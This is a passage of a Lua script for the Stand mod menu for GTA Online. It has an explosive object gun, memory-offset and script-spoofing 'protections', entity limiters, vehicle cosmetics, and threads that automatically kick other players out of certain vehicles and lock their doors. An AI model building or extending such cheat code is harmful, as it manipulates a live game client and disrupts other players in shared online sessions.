        local sped = entities.create_ped(1, hash, camcoords, CV)
        ENTITY.SET_ENTITY_INVINCIBLE(sped, true)
        util.yield(30)
        ENTITY.SET_ENTITY_ROTATION(sped, rot.x, rot.y, rot.z, 0, true)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(sped, 1, 0, 5000, 0, 0, true, true, true, true)
        table.insert(objtab, sped)
    end
end

local function oshot(hash, camcoords, rot)
    if not ENTITY.DOES_ENTITY_EXIST(obj_shot) then
        local objs = OBJECT.CREATE_OBJECT(hash, camcoords.x, camcoords.y, camcoords.z, true, true, true)
        ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(objs, players.user_ped(), false)
        util.yield(20)
        ENTITY.SET_ENTITY_ROTATION(objs, rot.x, rot.y, rot.z, 0, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(objs, 2, camcoords.x ,  150000, camcoords.z , 0, 0, 0, 0,  true, false, true, false, true)
        table.insert(objtab, objs)
    else
        local sobjs = OBJECT.CREATE_OBJECT(hash, camcoords.x, camcoords.y, camcoords.z, true, true, true)
        ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(sobjs, players.user_ped(), false)
        util.yield(20)
        ENTITY.SET_ENTITY_ROTATION(sobjs, rot.x, rot.y, rot.z, 0, true)
        ENTITY.APPLY_FORCE_TO_ENTITY(sobjs, 2, camcoords.x ,  150000, camcoords.z , 0, 0, 0, 0,  true, false, true, false, true)
        table.insert(objtab, sobjs)
    end
end

local function objshots(hash, obj, camcoords)
    local CV = CAM.GET_GAMEPLAY_CAM_RELATIVE_HEADING()
    local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    if STREAMING.IS_MODEL_A_VEHICLE(hash) then
        vshot(hash, camcoords, CV, rot)
        for i, car in objtab do
            if obj.expl then
                if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(car) then
                    local expcoor = ENTITY.GET_ENTITY_COORDS(car)
                    FIRE.ADD_EXPLOSION(expcoor.x, expcoor.y, expcoor.z, 81, 5000, true, false, 0.0, false)
                    entities.delete_by_handle(car)
                end


            end
            if i >= 150 then
                for index, vehs in objtab do
                    entities.delete_by_handle(vehs)
                    objtab ={}
                end
            end
            local carc = ENTITY.GET_ENTITY_COORDS(car)
            local tar2 = ENTITY.GET_ENTITY_COORDS(players.user_ped())
            local disbet = SYSTEM.VDIST2(tar2.x, tar2.y, tar2.z, carc.x, carc.y, carc.z)
            if disbet > 15000 then
                entities.delete_by_handle(car)
            end
        end
    elseif STREAMING.IS_MODEL_A_PED(hash) then
       pshot(hash, camcoords, CV, rot)
        for i, psho in objtab do
            if obj.expl then
                if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(psho) then
                    local expcoor = ENTITY.GET_ENTITY_COORDS(psho)
                    FIRE.ADD_EXPLOSION(expcoor.x, expcoor.y, expcoor.z, 81, 5000, true, false, 0.0, false)
                    entities.delete_by_handle(psho)
                end
                    
                local pedc = ENTITY.GET_ENTITY_COORDS(psh)
                local tar2 = ENTITY.GET_ENTITY_COORDS(players.user_ped())
                local disbet = SYSTEM.VDIST2(tar2.x, tar2.y, tar2.z, pedc.x, pedc.y, pedc.z)
                if disbet > 15000 then
                    entities.delete_by_handle(psh)
                end
            end
            if i >= 40 then
                for objtab as p_shot do
                    entities.delete_by_handle(p_shot)
                    objtab = {}
                end
            end
        end
    elseif STREAMING.IS_MODEL_VALID(hash) then
       oshot(hash, camcoords, rot)
        for i, objs in objtab do
           if obj.expl then
                if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(objs) then
                    local expcoor = ENTITY.GET_ENTITY_COORDS(objs)
                    FIRE.ADD_EXPLOSION(expcoor.x, expcoor.y, expcoor.z, 81, 5000, true, false, 0.0, false)
                    entities.delete_by_handle(objs)
                end

                    local objc = ENTITY.GET_ENTITY_COORDS(objs)
                    local tar2 = ENTITY.GET_ENTITY_COORDS(players.user_ped())
                    local disbet = SYSTEM.VDIST2(tar2.x, tar2.y, tar2.z, objc.x, objc.y, objc.z)

                if disbet > 15000 then
                    entities.delete_by_handle(objs)
                end
            end
                if i >= 40 then
                    for objtab as p_shot do
                        entities.delete_by_handle(p_shot)
                        objtab ={}
                    end
                end
            end
        end
    end

    SEC = ENTITY.SET_ENTITY_COORDS

    function Get_raycast_result(dist, flag)
        local result = {}
        flag = flag or 4294967295
        local didHit = memory.alloc(1)
        local endCoords = v3.new()
        local normal = v3.new()
        local hitEntity = memory.alloc_int()
        local camPos = CAM.GET_FINAL_RENDERED_CAM_COORD()
        local offset = Get_offset_from_camera(dist)
    
        local handle = SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            camPos.x, camPos.y, camPos.z,
            offset.x, offset.y, offset.z,
            flag,
            players.user_ped(), 7
        )
        SHAPETEST.GET_SHAPE_TEST_RESULT(handle, didHit, endCoords, normal, hitEntity)
    
        result.didHit = memory.read_byte(didHit) ~= 0
        result.endCoords = endCoords
        result.surfaceNormal = normal
        result.hitEntity = memory.read_int(hitEntity)
        return result
    end

    local function objams(obj_hash, obj, camcoords)
        local CV = CAM.GET_GAMEPLAY_CAM_RELATIVE_HEADING()
        if STREAMING.IS_MODEL_A_VEHICLE(obj_hash) then
            obj.prev = VEHICLE.CREATE_VEHICLE(obj_hash, camcoords.x, camcoords.y, camcoords.z, CV, true, true, false)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj.prev, players.user_ped(), false)
        elseif STREAMING.IS_MODEL_A_PED(obj_hash) then
            obj.prev = entities.create_ped(1, obj_hash, camcoords, CV)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj.prev, players.user_ped(), false)
        elseif STREAMING.IS_MODEL_VALID(obj_hash) then
            obj.prev = OBJECT.CREATE_OBJECT(obj_hash, camcoords.x, camcoords.y, camcoords.z, CV, true, true, true)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj.prev, players.user_ped(), false)
        end
        if obj.prev then
            ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(obj.prev , false, true)
            ENTITY.SET_ENTITY_ALPHA(obj.prev , 206, false)
            ENTITY.FREEZE_ENTITY_POSITION(obj.prev, true)
            ENTITY.SET_ENTITY_INVINCIBLE(obj.prev, true)
            SEC(obj.prev, camcoords.x, camcoords.y, camcoords.z, false, true, true, false)
        end
    end

    local set = {alert = true, scale = true}

local obj_hash = 'prop_keg_01'
local objgun = menu.list(weapons, "Custom Object Gun", {}, "")
local obj = {expl = false}
OBJgun = menu.toggle_loop(objgun, "Custom Object Gun", {"objgun"}, "Fires the object you have selected", function ()
    local hash = util.joaat(obj_hash)
    request_model(hash)
    if PLAYER.IS_PLAYER_FREE_AIMING(players.user()) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        local camcoords = get_offset_from_gameplay_camera(8)
        if not ENTITY.DOES_ENTITY_EXIST(obj.prev) then
            objams(hash, obj, camcoords)
        else
            SEC(obj.prev, camcoords.x, camcoords.y, camcoords.z, false, true, true, false)
        end
        ENTITY.SET_ENTITY_ROTATION(obj.prev, rot.x, rot.y, rot.z, 0, true)
        
    elseif ENTITY.DOES_ENTITY_EXIST(obj.prev) and not PLAYER.IS_PLAYER_FREE_AIMING(players.user()) then
        entities.delete_by_handle(obj.prev)
    end
    if PED.IS_PED_SHOOTING(players.user_ped()) and not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        local camcoords = get_offset_from_gameplay_camera(13)
        objshots(hash, obj, camcoords)
        entities.delete_by_handle(obj.prev)
    end
end)


menu.toggle(objgun, "Make Objects Explosive", {}, "Makes the objects you shoot explosive when hitting something", function(on)
    obj.expl =  on
end)


menu.text_input(objgun, "Custom Object", {"cusobj"}, "Enter the model name of an object to change the object you shoot example 'prop_keg_01'", function(cusobj)
    if STREAMING.IS_MODEL_A_VEHICLE(util.joaat(cusobj)) then
        obj_hash = cusobj
    elseif STREAMING.IS_MODEL_A_PED(util.joaat(cusobj)) then
        obj_hash = cusobj
    elseif STREAMING.IS_MODEL_VALID(util.joaat(cusobj)) then
        obj_hash = cusobj
    else
       if set.alert then
           util.toast("Improper Object Name (check the spelling)")
       end
    end
end, 'prop_keg_01')

menu.hyperlink(objgun, "Objects/Props", "https://gtahash.ru")

--------------------------------------------------------------------------------------------------------------------------------
--Protections

menu.toggle_loop(protects, "Accept Joins & Transaction Errors!", {"accepterrors"}, "Automatically accept join screens and transaction errors.", function()
    local mess_hash = HUD.GET_WARNING_SCREEN_MESSAGE_HASH()
    if mess_hash == -896436592 then
        util.toast("This player left the session.")
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1)
    elseif mess_hash == 1575023314 then
        util.toast("Session timeout.")
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1)
    elseif mess_hash == 1446064540 then
        util.toast("You are already in the session.")
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1)
        -- Auto Joins
    elseif mess_hash == 15890625 or mess_hash == -398982408 or mess_hash == -587688989 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        util.yield(50)
        -- Transaction Error
    elseif mess_hash == -991495373 then
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1)
    elseif mess_hash ~= 0 then
        util.toast(mess_hash, TOAST_CONSOLE)
    end
    util.yield()
end)

menu.toggle_loop(protects, "Block Transaction Error Script", {}, "Blocks the destroy vehicle script from being used maliciously to give you a transaction error.", function()
    if util.spoof_script("am_destroy_veh", SCRIPT.TERMINATE_THIS_THREAD) then
        util.toast("Destroy Vehicle Script Detected. Terminating Script...")
    end
end)

menu.action(protects, "Remove Attached Items/Objects", {}, "Removes Things Attached To You.", function()
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("mpmale")
    else
        menu.trigger_commands("mpfemale")
    end
end)

menu.toggle_loop(protects, "Block Clones", {}, "Will block clones and delete them.", function()
    for i, ped in ipairs(entities.get_all_peds_as_handles()) do
    if ENTITY.GET_ENTITY_MODEL(ped) == ENTITY.GET_ENTITY_MODEL(players.user_ped()) and not PED.IS_PED_A_PLAYER(ped) and not util.is_session_transition_active() then
        entities.delete_by_handle(ped)
        util.yield(200)
        end
    end
end)

menu.toggle_loop(protects, "Block PTFX/Particle Lag", {}, "Note: This Will Remove Any Particles In A Range", function()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 500)
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
end)

menu.toggle_loop(protects, "Anti Beast", {}, "Prevent them from turning you the beast with stand etc.", function()
    if SCRIPT.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0 then
        local host
        repeat
            host = NETWORK.NETWORK_GET_HOST_OF_SCRIPT("am_hunt_the_beast", -1, 0)
            util.yield()
        until host ~= -1
        util.toast(players.get_name(host).." started Hunt The Beast. Killing script...")
        menu.trigger_command(menu.ref_by_path("Online>Session>Session Scripts>Hunt the Beast>Stop Scrip"))
        menu.trigger_commands("stopsounds")
    end
end)

--for oppressor Mk2 blacklist
util.create_thread(function()
	while true do
		if oppressor_kick_players then
			local cur_players = players.list(target_self,target_friends,true)
			for k,v in pairs(cur_players) do
				local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
				local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
				if vehicle then
					local hash = util.joaat("oppressor2")
					if VEHICLE.IS_VEHICLE_MODEL(vehicle, hash) then
						menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(v))
						if lock_vehicle then
							VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
						end
					end
				end
			end
		end
		util.yield(200)
	end
end)

--for oppressor blacklist
util.create_thread(function()
	while true do
		if oppressormk2_kick_players then
			local cur_players = players.list(target_self,target_friends,true)
			for k,v in pairs(cur_players) do
				local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
				local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
				if vehicle then
					local hash = util.joaat("oppressor")
					if VEHICLE.IS_VEHICLE_MODEL(vehicle, hash) then
						menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(v))
						if lock_vehicle then
							VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
						end
					end
				end
			end
		end
		util.yield(200)
	end
end)

--for lazer blacklist
util.create_thread(function()
	while true do
		if lazer_kick_players then
			local cur_players = players.list(target_self,target_friends,true)
			for k,v in pairs(cur_players) do
				local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
				local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
				if vehicle then
					local hash = util.joaat("lazer")
					if VEHICLE.IS_VEHICLE_MODEL(vehicle, hash) then
						menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(v))
						if lock_vehicle then
							VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
						end
					end
				end
			end
		end
		util.yield(200)
	end
end)

--for kosatka blacklist
util.create_thread(function()
	while true do
		if kosatka_kick_players then
			local cur_players = players.list(target_self,target_friends,true)
			for k,v in pairs(cur_players) do
				local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
				local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
				if vehicle then
					local hash = util.joaat("kosatka")
					if VEHICLE.IS_VEHICLE_MODEL(vehicle, hash) then
						menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(v))
						if lock_vehicle then
							VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
						end
					end
				end
			end
		end
		util.yield(200)
	end
end)

--for hydra blacklist
util.create_thread(function()
	while true do
		if hydra_kick_players then
			local cur_players = players.list(target_self,target_friends,true)
			for k,v in pairs(cur_players) do
				local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
				local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
				if vehicle then
					local hash = util.joaat("hydra")
					if VEHICLE.IS_VEHICLE_MODEL(vehicle, hash) then
						menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(v))
						if lock_vehicle then
							VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
						end
					end
				end
			end
		end
		util.yield(200)
	end
end)

--for khanjali blacklist
util.create_thread(function()
	while true do
		if khanjali_kick_players then
			local cur_players = players.list(target_self,target_friends,true)
			for k,v in pairs(cur_players) do
				local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
				local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
				if vehicle then
					local hash = util.joaat("khanjali")
					if VEHICLE.IS_VEHICLE_MODEL(vehicle, hash) then
						menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(v))
						if lock_vehicle then
							VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
						end
					end
				end
			end
		end
		util.yield(200)
	end
end)

local Anti_Veh = menu.list(protects, "Anti Annoying", {}, "Anti (Oppressors, Lazers, Kosatka's, Hydra's, Khanjali's Ect)")

oppressor_kick_players = false
menu.toggle(Anti_Veh, "Anti-Oppressor", {"antioppressor"}, "Automatically kicks players off oppressor", function(on)
    oppressor_kick_players = on
end, false)

oppressormk2_kick_players = false
menu.toggle(Anti_Veh, "Anti-Oppressor Mk2", {"antioppressor"}, "Automatically kicks players off oppressor Mk2's", function(on)
    oppressormk2_kick_players = on
end, false)

lazer_kick_players = false
menu.toggle(Anti_Veh, "Anti-Lazer", {"antilazer"}, "Automatically kicks players out lazers", function(on)
    lazer_kick_players = on
end, false)

kosatka_kick_players = false
menu.toggle(Anti_Veh, "Anti-Kosatka", {"antikosatka"}, "Automatically kicks players out kosatka", function(on)
    kosatka_kick_players = on
end, false)

hydra_kick_players = false
menu.toggle(Anti_Veh, "Anti-Hydra", {"antihydra"}, "Automatically kicks players out hydra", function(on)
    hydra_kick_players = on
end, false)

khanjali_kick_players = false
menu.toggle(Anti_Veh, "Anti-Khanjali", {"antikhanjali"}, "Automatically kicks players out khanjali", function(on)
    khanjali_kick_players = on
end, false)

local values = {
    [0] = 0,
    [1] = 50,
    [2] = 88,
    [3] = 160,
    [4] = 208,
}

local anticage = menu.list(protects, "Anti-Cage", {}, "Note: This Affects Constructs and Other Buildables")
local alpha = 160
menu.slider(anticage, "Cage Alpha", {"cagealpha"}, "Cage transparency. If it is at 0 you will not see it", 0, #values, 3, 1, function(amount)
    alpha = values[amount]
end)

menu.toggle_loop(anticage, "Anti Cage", {"anticage"}, "", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, obj_ptr in ipairs(entities.get_all_objects_as_pointers()) do
        local net_obj = memory.read_long(obj_ptr + 0xd0)
        if net_obj == 0 or memory.read_byte(net_obj + 0x49) == players.user() then
            continue
        end
        local obj_handle = entities.pointer_to_handle(obj_ptr)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(obj_handle)
        for i, data in ipairs(my_ents) do
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha > 0 then
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj_handle, data, false)
                ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, obj_handle, false)
                ENTITY.SET_ENTITY_ALPHA(obj_handle, alpha, false)
            end
            if data ~= 0 and ENTITY.IS_ENTITY_TOUCHING_ENTITY(data, obj_handle) and alpha == 0 then
                entities.delete_by_handle(obj_handle)
            end
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(obj_handle)
    end
end)

menu.toggle_loop(protects, "Anti-Mugger", {}, "Block Muggers Targeting You.", function() -- thx nowiry for improving my method :D
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if (memory.read_int(sender) ~= player and memory.read_int(target) == player 
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId))) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("Blocked Mugger From " .. players.get_name(memory.read_int(sender)))
            end
        end)
    end
end)

 --==Limiters==-- 
local pool_limiter = menu.list(protects, "Limitador Pool", {}, "")

local ped_limit = 115
menu.slider(pool_limiter, "Ped Limit", {"pedlimi"}, "", 0, 250, 130, 1, function(amount)
    ped_limit = amount
end)

local veh_limit = 135
menu.slider(pool_limiter, "Vehicle Limit", {"vehlimi"}, "", 0, 300, 130, 1, function(amount)
    veh_limit = amount
end)

local obj_limit = 465
menu.slider(pool_limiter, "Object Limit", {"objlimi"}, "", 0, 2500, 600, 1, function(amount)
    obj_limit = amount
end)

 --==Seperated For Reason Of Enabling/Disabling Certain Limiters==-- 
menu.toggle_loop(pool_limiter, "Enable Ped Limiter", {}, "", function()
    local ped_count = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        util.yield()
        if ped ~= players.user_ped() then
            ped_count += 1
        end
        if ped_count >= ped_limit then
            for _, ped in pairs(entities.get_all_peds_as_handles()) do
                util.yield()
                entities.delete_by_handle(ped)
            end
        end
    end
end)

menu.toggle_loop(pool_limiter, "Enable Vehicle Limiter", {}, "", function()
    local veh__count = 0
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        util.yield()
        veh__count += 1
        if veh__count >= veh_limit then
            for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
                entities.delete_by_handle(veh)
            end
        end
    end
end)

menu.toggle_loop(pool_limiter, "Enable Object Limiter", {}, "", function()
    local obj_count = 0
    for _, obj in pairs(entities.get_all_objects_as_handles()) do
        util.yield()
        obj_count += 1
        if obj_count >= obj_limit then
            for _, obj in pairs(entities.get_all_objects_as_handles()) do
                entities.delete_by_handle(obj)
            end
        end
    end
end)

--------------------------------------------------------------------------------------------------------------------------------

 --==Vehicles==-- 
menu.toggle_loop(uwuvehicle, "Object Collision", {"ghostobjects"}, "Disables collisions with objects \nPlease Note: This Might Effect Constructor Related Things Aswell", function()
    local user = players.user_ped()
    local veh = PED.GET_VEHICLE_PED_IS_USING(user)
    local my_ents = {user, veh}
    for i, obj_ptr in ipairs(entities.get_all_objects_as_pointers()) do
        local net_obj = memory.read_long(obj_ptr + 0xd0)
        local obj_handle = entities.pointer_to_handle(obj_ptr)
        ENTITY.SET_ENTITY_ALPHA(obj_handle, 255, false)
        CAM.SET_GAMEPLAY_CAM_IGNORE_ENTITY_COLLISION_THIS_UPDATE(obj_handle)
        for i, data in ipairs(my_ents) do
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(obj_handle, data, false)
            ENTITY.SET_ENTITY_NO_COLLISION_ENTITY(data, obj_handle, false)  
        end
        SHAPETEST.RELEASE_SCRIPT_GUID_FROM_ENTITY(obj_handle)
    end
end)

function RGBNeonKit(pedm)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    for i = 0, 3 do
        VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, i, true)
    end
end

function Changeneon(player_id, color)
    local pedm = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, true)
    local spec = GetSpec(player_id)
    if not players.exists(player_id) then
        util.stop_thread()
    end
    GetControl(vmod, spec, player_id)
    RGBNeonKit(pedm)
    VEHICLE.SET_VEHICLE_NEON_INDEX_COLOUR(vmod, color)

end

local veh_speed = menu.list(uwuvehicle, "Vehicle Speed", {}, "Allows You To Edit Torque Of Vehicle Aka The Speed")

local num_for_torque = 500 --default torque value
menu.slider(veh_speed, "Torque Speed", {"torquespeed"}, "Default Is 500", 1, 2147483647, 500, 1, function(s)
	num_for_torque = s
end)

menu.toggle_loop(veh_speed, "Torque Toggle", {"torquetoggle"}, "", function()
    local veh = entities.get_user_vehicle_as_handle()
    if veh ~= nil then
        if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh) then
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
        end
        VEHICLE.MODIFY_VEHICLE_TOP_SPEED(veh, num_for_torque)
        ENTITY.SET_ENTITY_MAX_SPEED(veh, num_for_torque)
    end
end)

local rgbvm = menu.list(vehicles, "RGB Vehicle", {}, "Allows For RGB Neons ect.")
local rgb = {cus = 100}

menu.toggle_loop(rgbvm, "Custom RGB Synced", {}, "Change the vehicle color and neon lights to custom RGB with a synced color", function ()
   if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) != 0 then
        local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
        RGBNeonKit(players.user_ped())
        local red = (math.random(0, 255))
        local green = (math.random(0, 255))
        local blue = (math.random(0, 255))
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vmod, red, green, blue)
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vmod, red, green, blue)
        util.yield(rgb.cus)
   end
end)

menu.slider(rgbvm, "Custom RGB Speed", {''}, "Adjust the speed of the custom RGB", 1, 5000, 500, 10, function (c)
    rgb.cus = c
end)

    local srgb = {cus = 100}
menu.toggle_loop(rgbvm, "Synced Color with Headlights", {}, "Change the neons, headlights, interior and vehicle color to the same color", function ()
    local color = {
      {64, 1}, --blue
      {73, 2}, --eblue  
      {51, 3}, --mgreen
      {92, 4}, --lgreen
      {89, 5}, --yellow
      {88, 6}, --gshower
      {38, 7}, --orange
      {39 , 8}, --red
      {137, 9}, --ponypink
      {135, 10}, --hotpink
      {145, 11}, --purple
      {142, 12} --blacklight
    }
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) != 0 then
        local vmod = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
        RGBNeonKit(players.user_ped())
        local rcolor = math.random(1, 12)
        VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 22, true)
        VEHICLE.SET_VEHICLE_NEON_INDEX_COLOUR(vmod, color[rcolor][1])
		VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vmod, color[rcolor][2])
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vmod, 0, color[rcolor][1])
        VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vmod, color[rcolor][1])
        util.yield(srgb.cus)
    end
end)
  
menu.slider(rgbvm, "Synced RGB Speed", {''}, "Adjust the speed of the synced RGB", 1, 5000, 500, 10, function (c)
    srgb.cus = c
end)

menu.toggle_loop(uwuvehicle, "Auto-flip Vehicle", {}, "Automatically flips your car the right way if you land upside-down or sideways.", function()
    local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
    local rotation = CAM.GET_GAMEPLAY_CAM_ROT(2)
    local heading = v3.getHeading(v3.new(rotation))
    local vehicle_distance_to_ground = ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(player_vehicle)
    local am_i_on_ground = vehicle_distance_to_ground < 2 --and true or false
    local speed = ENTITY.GET_ENTITY_SPEED(player_vehicle)
    if not VEHICLE.IS_VEHICLE_ON_ALL_WHEELS(player_vehicle) and ENTITY.IS_ENTITY_UPSIDEDOWN(player_vehicle) and am_i_on_ground then
        VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(player_vehicle, 5.0)
        ENTITY.SET_ENTITY_HEADING(player_vehicle, heading)
        util.yield()
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(player_vehicle, speed)
    end
end)

 --==Full Credit To Frug & Nova_Plays==-- 
getVehicleThread = util.create_thread(function(thr)
	while true do 
		uwucurveh = entities.get_user_vehicle_as_handle(true)
		util.yield(2000)
	end
end)

menu.toggle_loop(uwuvehicle, "Loud Radio", {"loudradio"}, "Enables loud radio (like lowriders have) on your current vehicle.", function()
	AUDIO.SET_VEHICLE_RADIO_LOUD(uwucurveh, true)
end, function()
	AUDIO.SET_VEHICLE_RADIO_LOUD(uwucurveh, false)
end)

util.create_thread(function()
	while true do
		if drift then
			local veh = entities.get_user_vehicle_as_handle()
			if veh then
				if PAD.IS_CONTROL_PRESSED(0, 21) then
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, true)
				else
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, false)
				end
			end        
		end
		util.yield()
	end
end)

drift = false
menu.toggle(uwuvehicle, "Shift/A to Drift", {"driftmode"}, "Might Need To Respawn You're Vehicle After Turning It Off", function(drifttogglelol)
    drift = drifttogglelol
end)

menu.click_slider(vehicles, "Dirt level", {"dirt"}, "Makes your vehicle dirty.", 0, 15, 0, 1, function(dirtAmount)
	VEHICLE.SET_VEHICLE_DIRT_LEVEL(uwucurveh, dirtAmount)
end)

local licenseplate = menu.list(vehicles, "License Plate Options", {}, "")

local text = 'FewMod'
local animatedtext = ''
local animatedtext2 = ''
local animatedtext3 = ''
local animatedtext4 = ''
local animatedtext5 = ''
local animatedtext6 = ''
local animatedtext7 = ''
local animatedtext8 = ''
local animatedtext9 = ''
local animatedtext10 = ''
local animatedtext11 = ''
local animatedtext12 = ''
local animatedtext13 = ''
local animatedtext14 = ''

local plateTextInput = menu.text_input(licenseplate, "Custom License Plate Text", {"platetext"}, "License plate will be changed to this text when the below option is toggled.", function(platetext)
    text = platetext 
end, text)
menu.toggle_loop(licenseplate, "Enable Custom License Plate", {"plateenable"}, "Your license plate will be changed to the text you input above on every vehicle you are in.", function()
    if string.len(text) > 8 then
        text = ''
        util.toast("Text Is Too Long For Custom License Plate")
    else
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        if (PED.IS_PED_IN_ANY_VEHICLE(p)) then
	        menu.trigger_commands("plate "..text)
        end
    end
end)

local animatedplate = menu.list(licenseplate, "Antimated License Plate", {}, "")

local anispeed = 300
menu.slider_float(animatedplate, "Animated Speed", {}, "", 0, 10000, 300, 1, function(plateanimatedspeed) 
    anispeed = plateanimatedspeed
end)

local animateinput1 = menu.text_input(animatedplate, "Text 1", {"anitext1"}, "Animated Text 1 \nMust Be Less Then 8 Characters - Including Spaces", function(anitext1)
    animatedtext = anitext1 
end, animatedtext)

local animateinput2 = menu.text_input(animatedplate, "Text 2", {"anitext2"}, "Animated Text 2 \nMust Be Less Then 8 Characters - Including Spaces", function(anitext2)
    animatedtext2 = anitext2 
end, animatedtext2)

local animateinput3 = menu.text_input(animatedplate, "Text 3", {"anitext3"}, "Animated Text 3 \nMust Be Less Then 8 Characters - Including Spaces", function(anitext3)
    animatedtext3 = anitext3
end, animatedtext3)

local animateinput4 = menu.text_input(animatedplate, "Text 4", {"anitext4"}, "Animated Text 4 \nMust Be Less Then 8 Characters - Including Spaces", function(anitext4)
    animatedtext4 = anitext4 
end, animatedtext4)

